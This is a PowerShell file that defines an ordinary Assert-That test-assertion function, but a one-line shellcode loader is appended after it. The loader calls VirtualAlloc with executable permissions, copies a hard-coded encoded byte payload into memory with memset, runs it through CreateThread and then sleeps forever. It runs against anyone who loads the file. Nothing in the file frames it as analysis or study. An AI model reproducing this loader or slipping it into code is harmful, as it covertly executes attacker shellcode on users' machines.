













function Assert-That
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,Position=0)]
        [object]
        
        $InputObject,

        [Parameter(Mandatory=$true,ParameterSetName='Contains')]
        [object]
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        $Contains,

        [Parameter(Mandatory=$true,ParameterSetName='DoesNotContain')]
        [object]
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        $DoesNotContain,

        [Parameter(Mandatory=$true,ParameterSetName='DoesNotThrowException')]
        [Switch]
        
        $DoesNotThrowException,

        [Parameter(Mandatory=$true,ParameterSetName='ThrowsException')]
        [Type]
        
        $Throws,

        [Parameter(ParameterSetName='ThrowsException')]
        [string]
        
        $AndMessageMatches,

        [Parameter(ParameterSetName='Contains',Position=1)]
        [Parameter(ParameterSetName='DoesNotContain',Position=1)]
        [Parameter(ParameterSetName='ThrowsException',Position=1)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    switch( $PSCmdlet.ParameterSetName )
    {
        'Contains'
        {
            $interfaces = $InputObject.GetType().GetInterfaces()
            $failureMessage = @'
----------------------------------------------------------------------
{0}
----------------------------------------------------------------------

does not contain

----------------------------------------------------------------------
{1}
----------------------------------------------------------------------

{2}
'@ -f $InputObject,$Contains,$Message

            if( ($interfaces | Where-Object { $_.Name -eq 'IList' } ) )
            {
                if( $InputObject -notcontains $Contains )
                {
                    Fail $failureMessage
                    return
                }
            }
            elseif( ($interfaces | Where-Object { $_.Name -eq 'IDictionary' }) )
            {
                if( -not $InputObject.Contains( $Contains ) )
                {
                    Fail $failureMessage
                }
            }
            elseif( ($interfaces | Where-Object { $_.Name -eq 'ICollection' } ) )
            {
                $found = $false
                foreach( $item in $InputObject.GetEnumerator() )
                {
                    if( $item -eq $Contains )
                    {
                        $found = $true
                        break
                    }
                }

                if( -not $found )
                {
                    Fail $failureMessage
                }
            }
            else
            {
                if( $InputObject.ToString() -notlike ('*{0}*' -f [Management.Automation.WildcardPattern]::Escape($Contains.ToString())) )
                {
                    Fail $failureMessage
                }
            }
        }

        'DoesNotContain'
        {
            $interfaces = $InputObject.GetType().GetInterfaces()
            $failureMessage = @'
----------------------------------------------------------------------
{0}
----------------------------------------------------------------------

contains

----------------------------------------------------------------------
{1}
----------------------------------------------------------------------

{2}
'@ -f $InputObject,$DoesNotContain,$Message

            if( ($interfaces | Where-Object { $_.Name -eq 'IList' } ) )
            {
                if( $InputObject -contains $DoesNotContain )
                {
                    Fail $failureMessage
                    return
                }
            }
            elseif( ($interfaces | Where-Object { $_.Name -eq 'IDictionary' }) )
            {
                if( $InputObject.Contains( $DoesNotContain ) )
                {
                    Fail $failureMessage
                }
            }
            elseif( ($interfaces | Where-Object { $_.Name -eq 'ICollection' } ) )
            {
                $found = $false
                foreach( $item in $InputObject.GetEnumerator() )
                {
                    if( $item -eq $DoesNotContain )
                    {
                        $found = $true
                        break
                    }
                }

                if( $found )
                {
                    Fail $failureMessage
                }
            }
            else
            {
                if( $Contains -eq $null )
                {
                    $Contains = ''
                }

                if( $InputObject.ToString() -like ('*{0}*' -f [Management.Automation.WildcardPattern]::Escape($DoesNotContain.ToString())) )
                {
                    Fail $failureMessage
                }
            }
        }

        'DoesNotThrowException'
        {
            if( $InputObject -isnot [scriptblock] )
            {
                throw 'When using `DoesNotThrowException` parameter, `-InputObject` must be a ScriptBlock.'
            }

            try
            {
                Invoke-Command -ScriptBlock $InputObject
            }
            catch
            {
                Fail ('Script block threw an exception: {0}{1}{2}{1}{3}' -f $_.Exception.Message,([Environment]::NewLine),$_.ScriptStackTrace,$Message)
            }
        }

        'ThrowsException'
        {
            if( $InputObject -isnot [scriptblock] )
            {
                throw 'When using `Throws` parameter, `-InputObject` must be a ScriptBlock.'
            }

            $threwException = $false
            $ex = $null
            try
            {
                Invoke-Command -ScriptBlock $InputObject
            }
            catch
            {
                $ex = $_.Exception
                if( $ex -is $Throws )
                {
                    $threwException = $true
                }
                else
                {
                    Fail ('Expected ScriptBlock to throw a {0} exception, but it threw: {1}  {2}' -f $Throws,$ex,$Message)
                }
            }

            if( -not $threwException )
            {
                Fail ('ScriptBlock did not throw a ''{0}'' exception. {1}' -f $Throws.FullName,$Message)
            }

            if( $AndMessageMatches )
            {
                if( $ex.Message -notmatch $AndMessageMatches )
                {
                    Fail ('Exception message ''{0}'' doesn''t match ''{1}''.' -f $ex.Message,$AndMessageMatches)
                }
            }
        }
    }
}
$lSr = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $lSr -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc6,0xd9,0x74,0x24,0xf4,0xbe,0x0b,0x45,0xff,0x1d,0x58,0x2b,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x70,0x14,0x03,0x70,0x1f,0xa7,0x0a,0xe1,0xf7,0xa5,0xf5,0x1a,0x07,0xca,0x7c,0xff,0x36,0xca,0x1b,0x8b,0x68,0xfa,0x68,0xd9,0x84,0x71,0x3c,0xca,0x1f,0xf7,0xe9,0xfd,0xa8,0xb2,0xcf,0x30,0x29,0xee,0x2c,0x52,0xa9,0xed,0x60,0xb4,0x90,0x3d,0x75,0xb5,0xd5,0x20,0x74,0xe7,0x8e,0x2f,0x2b,0x18,0xbb,0x7a,0xf0,0x93,0xf7,0x6b,0x70,0x47,0x4f,0x8d,0x51,0xd6,0xc4,0xd4,0x71,0xd8,0x09,0x6d,0x38,0xc2,0x4e,0x48,0xf2,0x79,0xa4,0x26,0x05,0xa8,0xf5,0xc7,0xaa,0x95,0x3a,0x3a,0xb2,0xd2,0xfc,0xa5,0xc1,0x2a,0xff,0x58,0xd2,0xe8,0x82,0x86,0x57,0xeb,0x24,0x4c,0xcf,0xd7,0xd5,0x81,0x96,0x9c,0xd9,0x6e,0xdc,0xfb,0xfd,0x71,0x31,0x70,0xf9,0xfa,0xb4,0x57,0x88,0xb9,0x92,0x73,0xd1,0x1a,0xba,0x22,0xbf,0xcd,0xc3,0x35,0x60,0xb1,0x61,0x3d,0x8c,0xa6,0x1b,0x1c,0xd8,0x0b,0x16,0x9f,0x18,0x04,0x21,0xec,0x2a,0x8b,0x99,0x7a,0x06,0x44,0x04,0x7c,0x69,0x7f,0xf0,0x12,0x94,0x80,0x01,0x3a,0x52,0xd4,0x51,0x54,0x73,0x55,0x3a,0xa4,0x7c,0x80,0xd7,0xa1,0xea,0x77,0x74,0x1a,0x80,0xef,0x86,0x5a,0x41,0x4e,0x0f,0xbc,0x39,0xfe,0x40,0x11,0xf9,0xae,0x20,0xc1,0x91,0xa4,0xae,0x3e,0x81,0xc6,0x64,0x57,0x2b,0x29,0xd1,0x0f,0xc3,0xd0,0x78,0xdb,0x72,0x1c,0x57,0xa1,0xb4,0x96,0x54,0x55,0x7a,0x5f,0x10,0x45,0xea,0xaf,0x6f,0x37,0xbc,0xb0,0x45,0x52,0x40,0x25,0x62,0xf5,0x17,0xd1,0x68,0x20,0x5f,0x7e,0x92,0x07,0xd4,0xb7,0x06,0xe8,0x82,0xb7,0xc6,0xe8,0x52,0xee,0x8c,0xe8,0x3a,0x56,0xf5,0xba,0x5f,0x99,0x20,0xaf,0xcc,0x0c,0xcb,0x86,0xa1,0x87,0xa3,0x24,0x9c,0xe0,0x6b,0xd6,0xcb,0xf0,0x50,0x01,0x35,0x87,0xb8,0x91;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PoYs=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PoYs.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PoYs,0,0,0);for (;;){Start-sleep 60};

